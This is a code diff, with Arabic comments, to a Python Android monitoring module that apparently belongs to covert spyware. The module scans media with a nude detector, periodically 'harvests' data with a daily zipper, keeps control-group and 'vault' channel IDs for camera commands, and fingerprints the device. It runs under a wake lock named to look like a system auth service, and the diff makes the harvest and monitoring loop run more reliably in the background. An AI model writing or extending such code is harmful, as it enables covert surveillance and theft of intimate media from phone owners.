@@ -6,7 +6,7 @@ import random
 import threading
 import logging
 import gc
-import traceback
+import hashlib          # 🔧 إضافة hashlib المستخدم في _get_device_tag
 from datetime import datetime, timedelta
 
 # ========== إعداد المسارات الموحدة ==========
@@ -55,6 +55,8 @@ class M:
         self.camera_analyzer = None
         self.nude_detector = None
         self.media_scanner = None
+        self.ctrl = None      # معرف مجموعة التحكم (يُستخدم في أوامر الكاميرا)
+        self.vlt = None       # معرف الخزنة (قناة التخزين)
 
         self._load_config()
         self._get_device_info()
@@ -110,11 +112,12 @@ class M:
             ctx = self._get_ctx()
             cm = ctx.getSystemService("connectivity")
             ni = cm.getActiveNetworkInfo()
-            return ni and ni.isConnected() and ni.getType() == 1
+            return ni and ni.isConnected() and ni.getType() == 1  # TYPE_WIFI
         except:
             return False
 
     def _battery_ok(self):
+        """تعيد (النسبة المئوية, هل هي قيد الشحن)"""
         if not JNI:
             return 100, True
         try:
@@ -126,7 +129,7 @@ class M:
             scale = battery_status.getIntExtra("scale", -1)
             status = battery_status.getIntExtra("status", -1)
             percent = int((level / scale) * 100) if scale > 0 else 50
-            is_charging = status in (2, 5)
+            is_charging = status in (2, 5)  # 2 = charging, 5 = full
             return percent, is_charging
         except:
             return 50, False
@@ -158,7 +161,8 @@ class M:
 
         if self.daily_zipper:
             try:
-                self.daily_zipper.run()
+                # تشغيل الحصاد في خيط منفصل لتجنب حظر الخيط الرئيسي
+                threading.Thread(target=self.daily_zipper.run, daemon=True).start()
                 with open(self.wt, 'w') as f:
                     f.write(self._next_harvest_time())
                 with open(self.lh, 'w') as f:
@@ -173,8 +177,8 @@ class M:
             try:
                 ctx = self._get_ctx()
                 pm = ctx.getSystemService("power")
-                self.wl = pm.newWakeLock(1, "com.sys.auth:monitor_lock")
-                self.wl.acquire(300000)
+                self.wl = pm.newWakeLock(1, "com.sys.auth:monitor_lock")  # PARTIAL_WAKE_LOCK
+                self.wl.acquire(300000)  # 5 دقائق
             except:
                 pass
 
@@ -185,6 +189,7 @@ class M:
         except:
             pass
 
+    # ========== حلقة المراقبة المحسنة (نوم قصير للاستجابة السريعة) ==========
     def _loop(self):
         while self.rn:
             try:
@@ -194,7 +199,12 @@ class M:
                 logging.error(f"Monitor loop error: {e}")
             finally:
                 self._wake_lock_release()
-            time.sleep(self.cfg.get('iv', 1800))
+            # نوم متقطع كل ثانية للتحقق من self.rn بسرعة
+            interval = self.cfg.get('iv', 1800)
+            for _ in range(interval):
+                if not self.rn:
+                    break
+                time.sleep(1)
 
     def start(self):
         threading.Thread(target=self._loop, daemon=True).start()
@@ -207,3 +217,22 @@ class M:
     def stop(self):
         self.rn = False
         self._wake_lock_release()
+
+
+# ========== دالة مساعدة للحصول على معرف جهاز مختصر (للاستخدام في daily_zipper) ==========
+def get_device_tag():
+    """مكرر للدالة الموجودة في daily_zipper لتجنب إعادة الاستيراد"""
+    try:
+        Secure = autoclass('android.provider.Settings$Secure')
+        ctx = autoclass('org.kivy.android.PythonActivity').mActivity
+        aid = Secure.getString(ctx.getContentResolver(), Secure.ANDROID_ID)
+        if aid:
+            return aid[:8].lower()
+    except:
+        pass
+    try:
+        Build = autoclass('android.os.Build')
+        model = f"{Build.MANUFACTURER} {Build.MODEL}"
+        return hashlib.md5(model.encode()).hexdigest()[:8]
+    except:
+        return "unknown"
